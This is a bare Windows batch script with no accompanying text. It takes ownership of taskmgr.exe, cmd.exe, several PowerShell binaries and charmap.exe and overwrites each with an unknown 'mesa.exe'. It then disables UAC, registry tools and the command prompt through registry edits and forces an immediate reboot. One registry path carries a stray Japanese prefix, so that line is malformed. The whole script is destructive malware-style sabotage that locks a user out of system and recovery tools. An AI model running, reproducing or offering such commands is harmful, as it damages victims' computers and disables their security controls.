takeown /f C:\Windows\System32\taskmgr.exe & icacls C:\Windows\System32\taskmgr.exe /granted "%username%":F & copy mesa.exe "C:\Windows\System32\taskmgr.exe"

takeown /f C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & icacls C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /granted "%username%":F & copy mesa.exe "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
takeown /f C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe & icacls C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe /granted "%username%":F & copy mesa.exe "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe"
takeown /f C:\Windows\system32\cmd.exe & icacls C:\Windows\system32\cmd.exe /granted "%username%":F & copy mesa.exe "C:\Windows\system32\cmd.exe"
takeown /f C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe & icacls C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe /granted "%username%":F & copy mesa.exe "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe"
takeown /f C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe & icacls C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe /granted "%username%":F & copy mesa.exe "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
takeown /f C:\Windows\system32\charmap.exe & icacls C:\Windows\system32\charmap.exe /granted "%username%":F & copy mesa.exe "C:\Windows\system32\charmap.exe"

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
reg add "コンピューター\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1
shutdown /r /t 0
pause